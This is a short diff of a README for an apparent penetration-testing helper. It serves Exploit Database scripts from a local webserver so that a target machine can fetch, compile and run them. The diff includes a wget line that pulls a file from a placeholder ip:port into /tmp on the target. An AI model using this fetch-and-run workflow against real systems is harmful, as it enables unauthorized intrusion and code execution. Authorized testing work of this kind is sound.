@@ -1,6 +1,8 @@
 # Exploit Database Upload
 The purpose of this is to make the process of uploading exploit database scripts to a target machine. The local script will make 
-the webserver and the upload files will curl and compile/run the files (written to /tmp).
+the webserver and the upload files will curl and compile/run the files. I created this because I have been annoyed by the boring 
+process of uploading, compiling, running, and crying as each script fails (jk). This speeds up the process.
+It also allows other scripts to be uploaded and ran, so it isn't limited to exploit database exploits.
 
 ## Purpose and usage
 This is built to work in a pentest of most unix devices. The host system I use is kali linux, but any machine with SimpleHTTPServer 
@@ -19,7 +21,7 @@ bash local.sh
 
 Upload the 'upload' file to /tmp. I'll give the example of using a webserver
 ```
-wget *ip*:*port*/*file* > /tmp/upload.py
+wget ip:port/file > /tmp/upload.py
 ```
 Example
 ```
